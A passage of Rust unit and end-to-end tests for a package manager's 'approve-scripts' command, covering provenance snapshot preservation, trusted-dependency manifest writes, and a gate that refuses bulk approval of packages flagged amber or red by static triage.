            let transport = snapshot_for_binding_with_mode(&transport_map, "pkg", "1.0.0", mode)
                .expect("TransportDegraded must project under both modes");
            assert!(transport.is_none());
        }
    }

    /// A package missing from the batch map projects to `Ok(None)`
    /// under both modes — same as the pre-rollout shape. The mode
    /// only gates statuses that are present in the map.
    #[test]
    fn snapshot_for_binding_missing_pkg_projects_to_none_under_both_modes() {
        let map: HashMap<(String, String), ProvenanceStatus> = HashMap::new();
        for mode in [EnforceMode::Deny, EnforceMode::Warn] {
            let r = snapshot_for_binding_with_mode(&map, "pkg", "1.0.0", mode)
                .expect("missing pkg projects to Ok(None) regardless of mode");
            assert!(r.is_none());
        }
    }

    /// Load-bearing warn-mode regression guard: when the snapshot
    /// projection returns `None` (Warn + VerificationRejected, or
    /// any TransportDegraded), an existing exact-version binding's
    /// `provenance_at_approval` MUST be preserved rather than
    /// overwritten. Re-approving the same version with a `None`
    /// snapshot must not silently clear the prior verified identity
    /// and disarm drift detection.
    #[test]
    fn approval_metadata_preserving_existing_provenance_preserves_prior_snapshot_on_none() {
        let prior_snap = ProvenanceSnapshot {
            present: true,
            publisher: Some("github:acme/widget".into()),
            workflow_path: Some(".github/workflows/publish.yml".into()),
            workflow_ref: Some("refs/tags/v1.0.0".into()),
            attestation_cert_sha256: Some("sha256-leaf-prior".into()),
        };
        let mut trusted = TrustedDependencies::default();
        trusted.approve_with_metadata(
            "acme-widget",
            "1.0.0",
            ApprovalMetadata {
                integrity: Some("sha512-prior".into()),
                script_hash: Some("sha256-prior".into()),
                provenance_at_approval: Some(prior_snap),
                behavioral_tags_hash: None,
                behavioral_tags: None,
                capability_hash: None,
            },
        );

        let blocked = make_blocked("acme-widget", "1.0.0");
        let meta = approval_metadata_preserving_existing_provenance(&trusted, &blocked, None, None);
        let preserved = meta
            .provenance_at_approval
            .expect("preservation must substitute prior snapshot when incoming is None");
        assert_eq!(preserved.publisher.as_deref(), Some("github:acme/widget"));
        assert_eq!(
            preserved.attestation_cert_sha256.as_deref(),
            Some("sha256-leaf-prior"),
            "preserved snapshot must be the exact prior binding's snapshot, byte-for-byte",
        );
    }

    /// A fresh Verified observation always wins over the prior
    /// snapshot. Without this assertion the preservation logic
    /// could mask a legitimate identity change (publisher rotated,
    /// workflow path moved) by sticking with the stale prior value.
    #[test]
    fn approval_metadata_preserving_existing_provenance_lets_fresh_verified_win() {
        let prior_snap = ProvenanceSnapshot {
            present: true,
            publisher: Some("github:acme/widget".into()),
            attestation_cert_sha256: Some("sha256-leaf-prior".into()),
            ..Default::default()
        };
        let mut trusted = TrustedDependencies::default();
        trusted.approve_with_metadata(
            "acme-widget",
            "1.0.0",
            ApprovalMetadata {
                provenance_at_approval: Some(prior_snap),
                ..Default::default()
            },
        );

        let new_snap = ProvenanceSnapshot {
            present: true,
            publisher: Some("github:acme/widget".into()),
            attestation_cert_sha256: Some("sha256-leaf-NEW".into()),
            ..Default::default()
        };
        let blocked = make_blocked("acme-widget", "1.0.0");
        let meta = approval_metadata_preserving_existing_provenance(
            &trusted,
            &blocked,
            None,
            Some(new_snap),
        );
        assert_eq!(
            meta.provenance_at_approval
                .expect("incoming Some must pass through")
                .attestation_cert_sha256
                .as_deref(),
            Some("sha256-leaf-NEW"),
            "fresh Verified snapshot must replace the prior — preservation only fires on None",
        );
    }

    /// First-time approval (no prior binding) with a `None` incoming
    /// snapshot still records `None` — there's nothing to preserve.
    #[test]
    fn approval_metadata_preserving_existing_provenance_passes_none_through_on_first_approval() {
        let trusted = TrustedDependencies::default();
        let blocked = make_blocked("first-time-pkg", "1.0.0");
        let meta = approval_metadata_preserving_existing_provenance(&trusted, &blocked, None, None);
        assert!(
            meta.provenance_at_approval.is_none(),
            "first-time approval with no prior binding has nothing to preserve",
        );
    }

    fn write_manifest(path: &Path, value: &serde_json::Value) {
        fs::write(path, serde_json::to_string_pretty(value).unwrap()).unwrap();
    }

    fn read_manifest(path: &Path) -> serde_json::Value {
        serde_json::from_str(&fs::read_to_string(path).unwrap()).unwrap()
    }

    fn make_blocked(name: &str, version: &str) -> BlockedPackage {
        BlockedPackage {
            name: name.to_string(),
            version: version.to_string(),
            integrity: Some(format!("sha512-{name}-integrity")),
            script_hash: Some(format!("sha256-{name}-hash")),
            phases_present: vec!["postinstall".to_string()],
            binding_drift: false,
            // fields default to None for these approve-scripts
            // tests; dedicated tier-aware tests land in+.
            static_tier: None,
            provenance_at_capture: None,
            published_at: None,
            behavioral_tags_hash: None,
            behavioral_tags: None,
        }
    }

    /// helper: `make_blocked` + explicit tier.
    /// Used by the `--yes` refusal tests below to construct state
    /// that would be produced by a fresh install pipeline.
    fn make_blocked_tiered(
        name: &str,
        version: &str,
        tier: lpm_security::triage::StaticTier,
    ) -> BlockedPackage {
        let mut b = make_blocked(name, version);
        b.static_tier = Some(tier);
        b
    }

    fn write_state(project_dir: &Path, blocked: Vec<BlockedPackage>) {
        ensure_security_test_backend();
        let state = BuildState {
            state_version: BUILD_STATE_VERSION,
            blocked_set_fingerprint: "sha256-test".to_string(),
            captured_at: "T00:00:00Z".to_string(),
            blocked_packages: blocked,
            drift_ignore_override: None,
        };
        crate::build_state::write_build_state(project_dir, &state).unwrap();
    }

    fn write_default_manifest(dir: &Path) {
        ensure_security_test_backend();
        write_manifest(
            &dir.join("package.json"),
            &serde_json::json!({"name": "test", "version": "0.0.0"}),
        );
    }

    // ── Argument validation ─────────────────────────────────────────

    #[tokio::test]
    async fn approve_scripts_yes_and_list_together_hard_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let err = run(dir.path(), None, true, true, false, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("--list") && msg.contains("--yes"));
    }

    #[tokio::test]
    async fn approve_scripts_list_with_pkg_arg_hard_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let err = run(dir.path(), Some("esbuild"), false, true, false, true)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("--list"));
    }

    #[tokio::test]
    async fn approve_scripts_with_no_state_file_errors_with_install_first_message() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        // No state file written
        let err = run(dir.path(), None, false, true, false, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("lpm install"));
    }

    #[tokio::test]
    async fn approve_scripts_with_no_package_json_errors() {
        let dir = tempdir().unwrap();
        // No package.json
        let err = run(dir.path(), None, false, true, false, true)
            .await
            .unwrap_err();
        let msg = err.to_string();
        assert!(msg.contains("package.json"));
    }

    #[tokio::test]
    async fn approve_scripts_with_empty_blocked_set_succeeds_silently() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![]);
        // --list mode with empty blocked set should succeed
        let result = run(dir.path(), None, false, true, false, true).await;
        assert!(result.is_ok());
    }

    // ── --list mode ─────────────────────────────────────────────────

    #[tokio::test]
    async fn approve_scripts_list_does_not_mutate_package_json() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        let before = fs::read_to_string(dir.path().join("package.json")).unwrap();
        run(dir.path(), None, false, true, false, true)
            .await
            .unwrap();
        let after = fs::read_to_string(dir.path().join("package.json")).unwrap();
        assert_eq!(before, after, "--list must NOT mutate package.json");
    }

    // ── --yes (bulk approve) ────────────────────────────────────────

    #[tokio::test]
    async fn approve_scripts_yes_approves_everything_and_writes_rich_form() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );

        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let td = &after["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "must be Rich (object) form, got: {td}");
        let map = td.as_object().unwrap();
        assert!(map.contains_key("esbuild@0.25.1"));
        assert!(map.contains_key("sharp@0.33.0"));
        // Both bindings preserved
        assert_eq!(map["esbuild@0.25.1"]["scriptHash"], "sha256-esbuild-hash");
        assert_eq!(
            map["esbuild@0.25.1"]["integrity"],
            "sha512-esbuild-integrity"
        );
    }

    #[tokio::test]
    async fn approve_scripts_yes_emits_warning_in_json_mode() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        // Capturing stdout in nextest is tricky; instead just verify the
        // command succeeds and the manifest mutation lands. The warning
        // emission via tracing::warn is exercised by the integration path.
        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();
        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
    }

    #[tokio::test]
    async fn approve_scripts_yes_legacy_array_upgrades_to_rich() {
        let dir = tempdir().unwrap();
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "0.0.0",
                "lpm": {
                    "trustedDependencies": ["sharp"],
                },
            }),
        );
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let td = &after["lpm"]["trustedDependencies"];
        assert!(td.is_object(), "legacy array must be upgraded to Rich");
        let map = td.as_object().unwrap();
        // New approval
        assert!(map.contains_key("esbuild@0.25.1"));
        // Legacy entry preserved as `<name>@*`
        assert!(map.contains_key("sharp@*"));
    }

    #[tokio::test]
    async fn approve_scripts_yes_preserves_unrelated_manifest_fields() {
        let dir = tempdir().unwrap();
        write_manifest(
            &dir.path().join("package.json"),
            &serde_json::json!({
                "name": "test",
                "version": "1.2.3",
                "scripts": {"build": "tsc"},
                "dependencies": {"react": "^18.0.0"},
                "lpm": {"linker": "isolated"},
            }),
        );
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert_eq!(after["name"], "test");
        assert_eq!(after["version"], "1.2.3");
        assert_eq!(after["scripts"]["build"], "tsc");
        assert_eq!(after["dependencies"]["react"], "^18.0.0");
        // Existing lpm fields preserved
        assert_eq!(after["lpm"]["linker"], "isolated");
        // New trustedDependencies added
        assert!(after["lpm"]["trustedDependencies"].is_object());
    }

    // ── <pkg> argument ──────────────────────────────────────────────

    #[tokio::test]
    async fn approve_scripts_specific_package_by_name_approves_only_that_one() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(
            dir.path(),
            vec![
                make_blocked("esbuild", "0.25.1"),
                make_blocked("sharp", "0.33.0"),
            ],
        );

        // json_output=true so the confirm prompt is bypassed (auto-approve)
        run(dir.path(), Some("esbuild"), false, false, false, true)
            .await
            .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        let map = after["lpm"]["trustedDependencies"]
            .as_object()
            .expect("must be Rich");
        assert!(
            map.contains_key("esbuild@0.25.1"),
            "esbuild must be approved"
        );
        assert!(
            !map.contains_key("sharp@0.33.0"),
            "sharp must NOT be approved (was not the target)"
        );
    }

    #[tokio::test]
    async fn approve_scripts_specific_package_with_at_version_approves_only_that_one() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        run(
            dir.path(),
            Some("esbuild@0.25.1"),
            false,
            false,
            false,
            true,
        )
        .await
        .unwrap();

        let after = read_manifest(&dir.path().join("package.json"));
        assert!(after["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object());
    }

    #[tokio::test]
    async fn approve_scripts_specific_package_not_in_blocked_set_errors() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);

        let err = run(dir.path(), Some("not-installed"), false, false, false, true)
            .await
            .unwrap_err();
        assert!(err.to_string().contains("not in the blocked set"));
    }

    #[tokio::test]
    async fn find_blocked_by_arg_handles_scoped_names_with_at_in_scope() {
        // Sanity check: a scoped name `@scope/pkg` should match the bare-name
        // path, not be misparsed as `name@version` with empty name. The
        // helper checks `at > 0` to avoid the leading-`@` confusion.
        let blocked = vec![
            make_blocked("@scope/pkg", "1.0.0"),
            make_blocked("plain", "2.0.0"),
        ];
        let by_bare_scoped = find_blocked_by_arg(&blocked, "@scope/pkg");
        assert!(by_bare_scoped.is_some());
        assert_eq!(by_bare_scoped.unwrap().name, "@scope/pkg");

        let by_versioned_scoped = find_blocked_by_arg(&blocked, "@scope/pkg@1.0.0");
        assert!(by_versioned_scoped.is_some());

        let by_plain = find_blocked_by_arg(&blocked, "plain");
        assert_eq!(by_plain.unwrap().name, "plain");
    }

    // ── Atomic write semantics ──────────────────────────────────────

    #[tokio::test]
    async fn approve_scripts_writes_atomic_via_temp_file_rename() {
        let dir = tempdir().unwrap();
        write_default_manifest(dir.path());
        write_state(dir.path(), vec![make_blocked("esbuild", "0.25.1")]);
        run(dir.path(), None, true, false, false, true)
            .await
            .unwrap();

        // After a successful run, the parent directory should NOT contain
        // any leftover `.tmp` artifacts.
        let entries = std::fs::read_dir(dir.path()).unwrap();
        for entry in entries.flatten() {
            let name = entry.file_name();
            let s = name.to_string_lossy();
            assert!(
                !s.ends_with(".tmp") && !s.contains(".package.json."),
                "tempfile leaked: {s}"
            );
        }
    }

    // ── Schema versioning ───────────────────────────────────────────

    #[test]
    fn schema_version_is_at_least_1() {
        const _: () = assert!(SCHEMA_VERSION >= 1);
    }

    #[test]
    fn schema_version_bumped_for_static_tier() {
        // bumped to 2 when `static_tier` was
        // added to the blocked-entry JSON shape. If this test fails
        // because the version dropped, either a revert or a second
        // migration is needed — don't just bump the assertion.
        const _: () = assert!(SCHEMA_VERSION >= 2);
    }

    #[test]
    fn schema_version_bumped_for_version_diff() {
        // bumped to 3 when `version_diff` was
        // added to the blocked-entry JSON shape. If this test fails
        // because the version dropped, either a revert or a second
        // migration is needed — don't just bump the assertion.
        const _: () = assert!(SCHEMA_VERSION >= 3);
    }

    // ── — blocked_to_json + tier labels ─────────

    #[test]
    fn blocked_to_json_emits_static_tier_green() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("esbuild", "0.25.1");
        b.static_tier = Some(StaticTier::Green);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::json!("green"));
    }

    #[test]
    fn blocked_to_json_emits_static_tier_amber() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("playwright", "1.48.0");
        b.static_tier = Some(StaticTier::Amber);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::json!("amber"));
    }

    #[test]
    fn blocked_to_json_emits_static_tier_amber_llm() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("custom-tool", "1.0.0");
        b.static_tier = Some(StaticTier::AmberLlm);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        // Kebab-case wire contract (crate::triage's serde form).
        assert_eq!(v["static_tier"], serde_json::json!("amber-llm"));
    }

    #[test]
    fn blocked_to_json_emits_static_tier_red() {
        use lpm_security::triage::StaticTier;
        let mut b = make_blocked("malware", "0.0.1");
        b.static_tier = Some(StaticTier::Red);
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::json!("red"));
    }

    #[test]
    fn blocked_to_json_emits_null_when_tier_absent() {
        // Pre-P2 persisted state leaves `static_tier` as None; the
        // field MUST appear as `null` (not be omitted) so agents can
        // distinguish "no tier known" from "field missing".
        let b = make_blocked("pre-p2", "1.0.0");
        assert!(b.static_tier.is_none());
        let v = blocked_to_json(&b, &TrustedDependencies::default());
        assert_eq!(v["static_tier"], serde_json::Value::Null);
        // And the key is present in the object (not omitted).
        assert!(
            v.as_object().unwrap().contains_key("static_tier"),
            "static_tier key must be present in the JSON object even \
             when the value is null — agents rely on presence to \
             distinguish null-value from schema-missing",
        );
    }

    #[test]
    fn tier_label_text_distinct_per_variant() {
        use lpm_security::triage::StaticTier;
        let labels = [
            tier_label_text(StaticTier::Green),
            tier_label_text(StaticTier::Amber),
            tier_label_text(StaticTier::AmberLlm),
            tier_label_text(StaticTier::Red),
        ];
        let mut seen = std::collections::HashSet::new();
        for lbl in labels {
            assert!(
                seen.insert(lbl),
                "tier labels must be distinct; duplicate: {lbl}"
            );
        }
    }

    #[test]
    fn tier_label_text_green_starts_with_green() {
        use lpm_security::triage::StaticTier;
        // Pin the user-facing text: green labels must start with
        // "green" so the terminal user sees a recognizable word
        // before any symbol or parenthetical.
        assert!(tier_label_text(StaticTier::Green).starts_with("green"));
        assert!(tier_label_text(StaticTier::Amber).starts_with("amber"));
        assert!(tier_label_text(StaticTier::AmberLlm).starts_with("amber"));
        assert!(tier_label_text(StaticTier::Red).starts_with("red"));
    }

    #[test]
    fn colored_tier_label_embeds_plain_text() {
        use lpm_security::triage::StaticTier;
        // The colored form must contain the plain text somewhere
        // (after stripping ANSI codes would be ideal, but substring
        // is enough since none of the plain-text forms collide with
        // ANSI escape sequence bytes).
        for tier in [
            StaticTier::Green,
            StaticTier::Amber,
            StaticTier::AmberLlm,
            StaticTier::Red,
        ] {
            let plain = tier_label_text(tier);
            let colored = colored_tier_label(tier);
            assert!(
                colored.contains(plain),
                "colored label for {tier:?} must contain the plain-text \
                 form; plain={plain:?} colored={colored:?}"
            );
        }
    }

    // ── — enforce_tiered_yes_gate ───────────────
    //
    // Pure tests for the refusal helper. End-to-end `--yes` tests
    // live in the `run()` suite below (same test file, later
    // section).

    #[test]
    fn yes_gate_empty_blocked_set_is_ok() {
        // Edge case: --yes against an empty effective blocked set
        // is a no-op today (approves nothing). The gate must not
        // refuse in this case.
        let blocked: Vec<BlockedPackage> = Vec::new();
        assert!(enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok());
    }

    #[test]
    fn yes_gate_allows_all_green() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            make_blocked_tiered("pkg-a", "1.0.0", StaticTier::Green),
            make_blocked_tiered("pkg-b", "2.0.0", StaticTier::Green),
        ];
        assert!(
            enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok(),
            "an all-green effective set must pass the --yes gate"
        );
    }

    #[test]
    fn yes_gate_allows_none_tiered_legacy_state() {
        // Pre-P2 persisted state carries static_tier = None. The
        // gate must pass `None` through to preserve existing --yes
        // muscle memory during a → upgrade; the next install
        // will recapture the state with real tiers.
        let blocked = vec![make_blocked("esbuild", "0.25.1")];
        assert!(blocked[0].static_tier.is_none());
        assert!(
            enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok(),
            "None static_tier (pre-P2 legacy state) must pass through \
             the --yes gate"
        );
    }

    #[test]
    fn yes_gate_allows_mixed_green_and_none() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            make_blocked_tiered("fresh-green", "1.0.0", StaticTier::Green),
            make_blocked("legacy", "1.0.0"),
        ];
        assert!(enforce_tiered_yes_gate(&blocked, GateScope::Project).is_ok());
    }

    #[test]
    fn yes_gate_refuses_single_amber() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered(
            "playwright",
            "1.48.0",
            StaticTier::Amber,
        )];
        let err =
            enforce_tiered_yes_gate(&blocked, GateScope::Project).expect_err("amber must refuse");
        let msg = err.to_string();
        assert!(msg.contains("--yes refuses"), "got: {msg}");
        assert!(msg.contains("playwright@1.48.0"), "got: {msg}");
    }

    #[test]
    fn yes_gate_refuses_single_amber_llm() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered(
            "mystery",
            "3.0.0",
            StaticTier::AmberLlm,
        )];
        let err = enforce_tiered_yes_gate(&blocked, GateScope::Project)
            .expect_err("amber-llm must refuse");
        assert!(err.to_string().contains("--yes refuses"));
    }

    #[test]
    fn yes_gate_refuses_single_red() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered("evil-pkg", "0.0.1", StaticTier::Red)];
        let err =
            enforce_tiered_yes_gate(&blocked, GateScope::Project).expect_err("red must refuse");
        assert!(err.to_string().contains("--yes refuses"));
    }

    #[test]
    fn yes_gate_refuses_mix_and_lists_only_refusals() {
        use lpm_security::triage::StaticTier;
        let blocked = vec![
            make_blocked_tiered("safe-a", "1.0.0", StaticTier::Green),
            make_blocked_tiered("risky-a", "1.0.0", StaticTier::Amber),
            make_blocked("legacy", "2.0.0"),
            make_blocked_tiered("risky-b", "3.0.0", StaticTier::Red),
        ];
        let err =
            enforce_tiered_yes_gate(&blocked, GateScope::Project).expect_err("mix must refuse");
        let msg = err.to_string();

        // Refusals listed.
        assert!(msg.contains("risky-a@1.0.0"), "got: {msg}");
        assert!(msg.contains("risky-b@3.0.0"), "got: {msg}");
        // Count accurate (2 refusals, not 4).
        assert!(
            msg.contains("2 package(s)"),
            "count must reflect only refusals, not the whole set; got: {msg}"
        );
        // Green and None entries NOT listed as refusals.
        assert!(
            !msg.contains("safe-a@1.0.0"),
            "green must not be listed: {msg}"
        );
        assert!(
            !msg.contains("legacy@2.0.0"),
            "None-tier must not be listed: {msg}"
        );
    }

    #[test]
    fn yes_gate_error_message_redirects_to_interactive_path() {
        // The error must tell the user HOW to proceed; otherwise the
        // refusal is just a dead-end.
        use lpm_security::triage::StaticTier;
        let blocked = vec![make_blocked_tiered("x", "1.0.0", StaticTier::Amber)];
        let msg = enforce_tiered_yes_gate(&blocked, GateScope::Project)
            .expect_err("amber must refuse")
            .to_string();
        assert!(
            msg.contains("lpm approve-scripts")
                && (msg.contains("interactive") || msg.contains("<pkg>") || msg.contains("--list")),
            "error must redirect to the interactive / single-pkg / list path; got: {msg}"
        );
    }

    // ── Generalized gate over AggregateBlockedRow (global scope) ─────
    //
    // Pins the same refusal contract via the generic helper. Without
    // these tests, a future refactor that drops `impl TieredRow for
    // AggregateBlockedRow` or skips the `static_tier` field at
    // aggregation time would silently re-open the M75 hole.

    fn agg_row_tiered(
        name: &str,
        version: &str,
        tier: lpm_security::triage::StaticTier,
    ) -> crate::global_blocked_set::AggregateBlockedRow {
        crate::global_blocked_set::AggregateBlockedRow {
            name: name.into(),
            version: version.into(),
            integrity: Some("sha512-fixture".into()),
            script_hash: Some("sha256-fixture".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: Some(tier),
            origins: vec!["origin-pkg".into()],
        }
    }

    fn agg_row_no_tier(
        name: &str,
        version: &str,
    ) -> crate::global_blocked_set::AggregateBlockedRow {
        crate::global_blocked_set::AggregateBlockedRow {
            name: name.into(),
            version: version.into(),
            integrity: Some("sha512-fixture".into()),
            script_hash: Some("sha256-fixture".into()),
            phases_present: vec!["postinstall".into()],
            binding_drift: false,
            static_tier: None,
            origins: vec!["origin-pkg".into()],
        }
    }

    #[test]
    fn yes_gate_global_allows_all_green_aggregate() {
        use lpm_security::triage::StaticTier;
        let rows = vec![
            agg_row_tiered("a", "1.0.0", StaticTier::Green),
            agg_row_tiered("b", "2.0.0", StaticTier::Green),
        ];
        assert!(
            enforce_tiered_yes_gate(&rows, GateScope::Global).is_ok(),
            "all-green aggregate must pass the global gate"
        );
    }

    #[test]
    fn yes_gate_global_passes_through_none_tier_legacy_state() {
        // Pre-classification aggregate rows (e.g. fixtures or older
        // per-install state predating the static_tier field) must
        // continue through. Parity with the project gate's pass-through
        // contract.
        let rows = vec![agg_row_no_tier("legacy", "1.0.0")];
        assert!(rows[0].static_tier.is_none());
        assert!(enforce_tiered_yes_gate(&rows, GateScope::Global).is_ok());
    }

    #[test]
    fn yes_gate_global_refuses_amber_aggregate_row() {
        use lpm_security::triage::StaticTier;
        let rows = vec![agg_row_tiered("playwright", "1.48.0", StaticTier::Amber)];
        let err = enforce_tiered_yes_gate(&rows, GateScope::Global)
            .expect_err("amber aggregate row must refuse");
        let msg = err.to_string();
        assert!(msg.contains("--yes refuses"), "got: {msg}");
        assert!(msg.contains("playwright@1.48.0"), "got: {msg}");
        // Scope-specific redirect prose.
        assert!(
            msg.contains("--global"),
            "global-scope redirect must mention --global; got: {msg}"
        );
    }

    #[test]
    fn yes_gate_global_refuses_red_aggregate_row() {
        use lpm_security::triage::StaticTier;
        let rows = vec![agg_row_tiered("evil-pkg", "0.0.1", StaticTier::Red)];
        let err = enforce_tiered_yes_gate(&rows, GateScope::Global)
            .expect_err("red aggregate row must refuse");
        assert!(err.to_string().contains("--yes refuses"));
    }

    #[test]
    fn yes_gate_global_redirect_prose_is_scope_specific() {
        use lpm_security::triage::StaticTier;
        let rows = vec![agg_row_tiered("x", "1.0.0", StaticTier::Amber)];
        let global_msg = enforce_tiered_yes_gate(&rows, GateScope::Global)
            .expect_err("global gate must refuse")
            .to_string();
        // Both flag forms surface so agents redirecting users see the
        // correct command.
        assert!(
            global_msg.contains("approve-scripts --global"),
            "got: {global_msg}"
        );

        let project_blocked = vec![make_blocked_tiered("x", "1.0.0", StaticTier::Amber)];
        let project_msg = enforce_tiered_yes_gate(&project_blocked, GateScope::Project)
            .expect_err("project gate must refuse")
            .to_string();
        assert!(
            !project_msg.contains("approve-scripts --global"),
            "project redirect must not advise --global; got: {project_msg}"
        );
    }

    // ── end-to-end state-machine tests ─────────
    //
    // These exercise the full install → block → review → approve → build
    // pipeline by composing build_state capture with approve-scripts
    // and re-running to verify the suppression rule honors the new
    // approval. The actual `lpm rebuild` script execution is out of scope
    // for unit tests (it spawns child processes); the strict gate is
    // verified separately by the build.rs::tests::build_strict_gate_*
    // tests.
    //
    // The state machine cells we lock in:
    //   1. install ⇒ block
    //   2. install ⇒ block ⇒ approve via --yes ⇒ install ⇒ silent
    //   3. install ⇒ block ⇒ approve specific pkg ⇒ install ⇒ silent
    //   4. install ⇒ block ⇒ approve ⇒ script body changes ⇒ install ⇒ re-blocked
    //   5. install with legacy array form ⇒ block ⇒ approve --yes ⇒ rich form
    //   6. install with no scriptable packages ⇒ no state, no warning

    use crate::build_state::{self, capture_blocked_set_after_install};
    use lpm_security::SecurityPolicy;
    use lpm_store::PackageStore;

    fn fake_store_with_pkg(
        store_root: &Path,
        name: &str,
        version: &str,
        scripts: &serde_json::Value,
    ) {
        let safe = name.replace('/', "+");
        let pkg_dir = store_root.join("v1").join(format!("{safe}@{version}"));
        fs::create_dir_all(&pkg_dir).unwrap();
        let pkg = serde_json::json!({
            "name": name,
            "version": version,
            "scripts": scripts,
        });
        fs::write(
            pkg_dir.join("package.json"),
            serde_json::to_string_pretty(&pkg).unwrap(),
        )
        .unwrap();
    }

    fn read_policy(project_dir: &Path) -> SecurityPolicy {
        SecurityPolicy::from_package_json(&project_dir.join("package.json"))
    }

    #[tokio::test]
    async fn e2e_install_block_review_approve_yes_then_install_is_silent() {
        // The canonical happy path: blocked → approve --yes → silent.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        // (1) First install ⇒ blocked, warning emitted
        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);
        assert_eq!(cap1.state.blocked_packages.len(), 1);

        // (2) Approve via --yes
        run(project.path(), None, true, false, false, true)
            .await
            .unwrap();
        let manifest = read_manifest(&project.path().join("package.json"));
        assert!(
            manifest["lpm"]["trustedDependencies"]["esbuild@0.25.1"].is_object(),
            "yes mode must write the rich entry"
        );

        // (3) Re-run install with the new policy ⇒ silent
        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            cap2.all_clear_banner || !cap2.should_emit_warning,
            "post-approval install should be silent or emit the all-clear banner"
        );
        assert!(cap2.state.blocked_packages.is_empty());

        // (4) A SECOND post-approval install should also be silent (no
        // repeated all-clear banner).
        let cap3 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(
            !cap3.should_emit_warning,
            "second post-approval install must be silent (no banner spam)"
        );
    }

    #[tokio::test]
    async fn e2e_install_block_approve_specific_then_install_is_silent() {
        // Same as the --yes flow but using `<pkg>` for a single approval.
        let project = tempdir().unwrap();
        let store_root = tempdir().unwrap();
        let store = PackageStore::at(store_root.path().to_path_buf());
        write_default_manifest(project.path());
        fake_store_with_pkg(
            store_root.path(),
            "esbuild",
            "0.25.1",
            &serde_json::json!({"postinstall": "tsc"}),
        );

        let installed: Vec<(String, String, Option<String>)> = vec![(
            "esbuild".to_string(),
            "0.25.1".to_string(),
            Some("sha512-x".to_string()),
        )];

        let cap1 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap1.should_emit_warning);

        // Approve esbuild specifically (json_output=true bypasses TTY confirm)
        run(project.path(), Some("esbuild"), false, false, false, true)
            .await
            .unwrap();

        let cap2 = capture_blocked_set_after_install(
            project.path(),
            &store,
            &installed,
            &read_policy(project.path()),
        )
        .unwrap();
        assert!(cap2.state.blocked_packages.is_empty());
    }

    #[tokio::test]
    async fn e2e_install_block_approve_then_script_drift_re_blocks() {
        // The CRITICAL invariant — script_hash binding actually catches
        // post-approval drift. Approve, then mutate the script in the
        // store, then re-run install: package re-blocked with binding_drift = true.
